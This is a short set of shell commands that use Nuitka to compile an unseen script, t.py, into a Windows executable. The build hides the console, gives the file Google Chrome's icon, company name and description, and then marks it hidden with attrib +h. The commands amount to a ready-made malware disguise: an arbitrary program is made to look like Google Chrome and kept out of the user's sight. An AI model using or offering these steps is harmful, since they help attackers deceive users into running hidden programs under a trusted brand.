pip install zstandard
pip install nuitka

nuitka --onefile --windows-disable-console --windows-icon-from-ico=chrome.ico --windows-company-name=Google --windows-file-version=1.0.0.1 --windows-file-description="Google Chrome"  t.py
attrib +h t.exe
